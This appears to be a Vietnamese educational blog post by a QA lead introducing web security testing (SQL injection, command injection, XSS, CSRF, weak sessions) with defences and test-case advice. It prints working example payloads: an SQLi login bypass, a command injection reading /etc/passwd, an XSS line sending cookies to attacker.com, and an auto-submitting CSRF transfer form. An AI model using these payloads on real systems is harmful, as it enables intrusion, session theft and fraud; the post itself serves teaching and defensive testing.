---
title: "Kỹ thuật Security & Penetration Testing cơ bản cho kiểm thử viên Web"
date: 2026-05-11
description: "Nắm vững các kỹ thuật tấn công phổ biến nhất (XSS, SQLi, CSRF) để nâng tầm khả năng kiểm thử của bạn từ một QA đơn thuần thành chuyên gia bảo mật."
tags: ["Security","Penetration Testing","QA"]
imageUrl: "https://images.unsplash.com/photo-1542831371-29b0f74f9713?q=80&w=600"
author: "Trí Trần"
---

# 🛡️ Kỹ thuật Security & Penetration Testing cơ bản cho kiểm thử viên Web

*Chào các đồng nghiệp QA và các bạn đang theo đuổi con đường Kiểm thử phần mềm,*

Tôi là Trí Trần. Trong suốt sự nghiệp làm QE Lead, tôi đã chứng kiến rất nhiều trường hợp phần mềm hoạt động hoàn hảo về mặt chức năng (functional), nhưng lại sụp đổ thảm hại khi đối diện với một cuộc tấn công bảo mật đơn giản. Điều này đã thay đổi góc nhìn của tôi về vai trò của Quality Assurance.

Ngày nay, QA không chỉ là những người bấm nút để kiểm tra tính đúng đắn, mà còn phải là **người phòng thủ đầu tiên** và đôi khi là **kẻ tìm kiếm lỗ hổng**. Việc hiểu biết cơ bản về Security Testing và Penetration Testing (PenTest) không còn là lợi thế nữa, mà đã trở thành một yêu cầu bắt buộc của bất kỳ kỹ sư kiểm thử web chuyên nghiệp nào.

Bài viết này được tôi thiết kế để cung cấp cho bạn một cái nhìn tổng quan, thực tế và dễ áp dụng nhất về những kỹ thuật cơ bản nhất mà bạn phải nắm vững khi tự mình "giả vai hacker" trên các ứng dụng Web.

---

## 🧠 Phần I: Thay đổi tư duy - Từ Functional sang Security Mindset

Trước khi đi sâu vào code hay payload, điều quan trọng nhất chúng ta cần làm là thay đổi tư duy.

**Kiểm thử chức năng (Functional Testing)** hỏi rằng: *“Hệ thống có hoạt động đúng như tài liệu yêu cầu không?”*
**Kiểm thử bảo mật (Security Testing)** hỏi rằng: *“Nếu tôi cố tình phá vỡ quy tắc, hệ thống có bị rò rỉ dữ liệu hoặc mất kiểm soát không?”*

Hãy nhớ nguyên tắc vàng này: **Mỗi input của người dùng đều là một potential vulnerability.** Never trust user data!

Chúng ta sẽ tập trung vào 4 nhóm lỗ hổng phổ biến nhất theo danh sách OWASP Top 10.

## 💉 Phần II: Các kỹ thuật Penetration Testing cốt lõi

### 1. Injection Flaw (Lỗ hổng Tiêm mã)

Đây là loại lỗ hổng nghiêm trọng và kinh điển nhất. Về cơ bản, nó xảy ra khi ứng dụng Web nhận dữ liệu đầu vào từ người dùng và đưa dữ liệu này vào một lệnh truy vấn (query), mà không hề làm vệ sinh hoặc xác thực dữ liệu đó trước. Kẻ tấn công lợi dụng điều này để "tiêm" thêm các đoạn mã độc hại vào câu lệnh gốc.

#### A. SQL Injection (SQLi)
Mục tiêu: Thay đổi logic của câu lệnh truy vấn cơ sở dữ liệu (Database Query).

**Tình huống Giả định:**
Hệ thống đăng nhập nhận input `username` và `password`, sau đó thực hiện query tương tự sau:
`SELECT * FROM users WHERE username = '$input_user' AND password = '$input_pass';`

**Kỹ thuật tấn công (Payload):**
Thay vì nhập mật khẩu, bạn chỉ cần nhập vào ô Username payload sau:
```sql
' OR '1'='1 -- 
```

**Giải thích của Trí Trần:**
*   Dấu nháy đơn đầu tiên (`'`) đóng lại chuỗi ký tự mà hệ thống mong đợi.
*   `OR '1'='1'` là một điều kiện luôn đúng (True). Khi cơ sở dữ liệu gặp câu lệnh `WHERE... OR TRUE`, nó sẽ trả về kết quả cho mọi bản ghi, bỏ qua cả việc so sánh mật khẩu ban đầu.
*   `-- ` (hai gạch ngang) hoặc `#` là cú pháp comment trong SQL, dùng để vô hiệu hóa phần còn lại của câu lệnh gốc (ví dụ: phần kiểm tra mật khẩu).

**Kết quả:** Hệ thống sẽ nhận định rằng điều kiện luôn đúng và cho phép bạn đăng nhập mà không cần biết mật khẩu hợp lệ. Đây là cách thức cơ bản nhất để vượt qua xác thực bằng SQLi.

#### B. Command Injection
Tương tự, nhưng thay vì nhắm vào Database, ta nhắm vào hệ điều hành (OS) của máy chủ (ví dụ: Lệnh Bash trên Linux). Nếu một chức năng Web cho phép bạn nhập tham số chạy lệnh hệ thống (ví dụ: tra cứu IP bằng công cụ `ping`), payload sẽ là:
```bash
127.0.0.1 ; cat /etc/passwd 
```
Dấu chấm phẩy (`;`) buộc hệ thống thực thi một lệnh mới, cho phép attacker xem nội dung file cấu hình người dùng (`/etc/passwd`).

---

### 2. Cross-Site Scripting (XSS)

Đây là lỗ hổng phổ biến nhất trong các ứng dụng Web và rất dễ bị bỏ qua. XSS xảy ra khi ứng dụng nhận dữ liệu từ người dùng, lưu trữ nó vào cơ sở dữ liệu, và sau đó hiển thị lại nội dung này trên trình duyệt của một người dùng khác **mà không được mã hóa (encoding)**.

**Nguyên tắc:** Data is rendered as code.
Dữ liệu đầu vào được coi là văn bản thông thường, nhưng hệ thống lại hiểu nó là mã lệnh HTML/JavaScript và thực thi nó.

**Ví dụ thực tế (Stored XSS):**
Giả sử bạn để lại bình luận trên một diễn đàn. Kẻ tấn công nhập payload sau:
```html
<script>alert('XSS by Trí Trần');</script> 
<!-- Hoặc tệ hơn: lấy cookie session của nạn nhân -->
<script>document.location='http://attacker.com/?cookie='+document.cookie;</script>
```

**Giải thích của Trí Trần:**
1.  Bạn lưu payload này vào Database (bình luận).
2.  Khi người dùng khác mở trang đó, hệ thống lấy nội dung từ DB và hiển thị thẳng lên trình duyệt: `<script>...</script>`.
3.  Trình duyệt nhận diện đây là thẻ lệnh JavaScript hợp lệ và tự động thực thi nó, khiến hộp thoại `alert` hiện ra (hoặc tệ hơn là gửi cookie phiên làm việc của nạn nhân cho hacker).

**Cách phòng tránh:** Luôn sử dụng Output Encoding (ví dụ: thay thế `<` bằng `&lt;`, `>` bằng `&gt;`).

---

### 3. Cross-Site Request Forgery (CSRF)

Mục tiêu của CSRF là buộc người dùng đang *được xác thực* trên một trang web nào đó, vô tình thực hiện các hành động nhạy cảm mà họ không hề hay biết và không cho phép.

**Kịch bản:**
Bạn đang đăng nhập vào ngân hàng A (Webbank) và có phiên làm việc hợp lệ. Bạn mở tab mới và truy cập trang của bạn bè. Trang web của bạn bè chứa một đoạn mã HTML:
```html
<form action="https://webbank-a.com/transfer" method="POST">
    <input type="hidden" name="recipient" value="HACKER_ACCOUNT_ID">
    <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script> 
```

**Giải thích của Trí Trần:**
Vì bạn đã ở trong một tab liên quan đến webbank-a.com, trình duyệt sẽ tự động gửi kèm **Cookie Phiên Làm Việc (Session Cookie)** của bạn khi form này được submit. Webbank A nhận yêu cầu: "Người dùng này đang hợp lệ, và họ vừa thực hiện lệnh chuyển tiền". Nó tin tưởng tuyệt đối vào cookie đó, và giao dịch thành công!

**Cách phòng tránh:** Sử dụng Anti-CSRF Token (mã token ngẫu nhiên, duy nhất) được nhúng trong các form submit. Máy chủ phải kiểm tra xem yêu cầu gửi đến có chứa token này hay không.

---

### 4. Broken Authentication & Session Management

Đây là lỗ hổng liên quan đến việc kiểm soát phiên đăng nhập của người dùng. Hacker sẽ tìm cách:
1.  **Guessing Passwords:** Dùng Brute Force (tấn công vét cạn) nếu quy trình khóa tài khoản sau N lần thất bại bị bỏ qua.
2.  **Predictable Session IDs:** Nếu ID phiên làm việc có tính tuần tự (ví dụ: `session_id=100`, `session_id=101`), hacker chỉ cần đoán được ID tiếp theo và chiếm đoạt phiên làm việc của người khác.

## 🛠️ Phần III: Quy trình Kiểm thử Thực chiến với Công cụ hỗ trợ

Bạn không cần phải ghi nhớ tất cả các payload thủ công. Bạn cần biết *cách thức* tìm kiếm vấn đề.

1.  **Proxy Interception (Quan trọng nhất):**
    Sử dụng các công cụ như **Burp Suite Community Edition** hoặc **OWASP ZAP**.
    Vai trò của Proxy là chặn (intercept) mọi yêu cầu HTTP/HTTPS mà trình duyệt gửi đi và nhận lại. Điều này cho phép bạn kiểm tra:
    *   Tham số nào được gửi khi thực hiện hành động?
    *   Session ID nằm ở đâu?
    *   Có tham số bí mật nào bị lộ trên URL không?

2.  **Thiết lập Test Case Bảo mật:**
    Khi viết test case cho một tính năng (ví dụ: `Thêm bình luận`), đừng chỉ viết:
    *   `TC_BìnhLuận_001`: Nhập tiêu đề hợp lệ và bài viết. **(Pass)**

    Hãy bổ sung thêm các trường hợp tiêu cực bảo mật (Negative Security Cases):
    *   `SC_BìnhLuận_002 (XSS)`: Thử nhập `<script>alert(1)</script>` vào nội dung. **(Expected Failure/Sanitization)**
    *   `SC_BìnhLuận_003 (Injection)`: Thử kết hợp payload SQLi và XSS trong cùng một input. **(Expected Failure/Validation)**

## 🚀 Kết luận và Lời khuyên từ QE Lead Trí Trần

Nắm được các kỹ thuật này sẽ giúp bạn nâng tầm vai trò QA của mình lên một cấp độ mới, trở thành một mắt xích không thể thiếu trong chu trình phát triển an toàn (SecDevOps).

**Tóm lại, khi kiểm thử Web, hãy luôn nhớ:**
1.  **Không bao giờ tin tưởng bất kỳ input nào từ người dùng.** Luôn xác thực và vệ sinh dữ liệu đầu vào ở tầng Backend.
2.  **Luôn kiểm tra luồng dữ liệu (Data Flow):** Dữ liệu đi vào đâu, lưu trữ ở đâu, và được hiển thị ra sao? Tại mỗi điểm đó, lỗ hổng có thể xảy ra.
3.  **Hãy là một người hoài nghi.** Giả định rằng tất cả các cơ chế bảo mật đều bị thiếu sót cho đến khi bạn chứng minh được điều ngược lại.

Đây chỉ là những kiến thức nền tảng nhất. Để trở thành một chuyên gia thực thụ, bạn cần học sâu về cách hoạt động của HTTP, các chuẩn mã hóa (encoding), và phải dành thời gian thực hành trên các lab an toàn như OWASP Juice Shop.

Chúc các đồng nghiệp luôn giữ vững sự tỉ mỉ và đôi mắt sắc bén!

**Trí Trần**
*QE Lead | Security Advocate*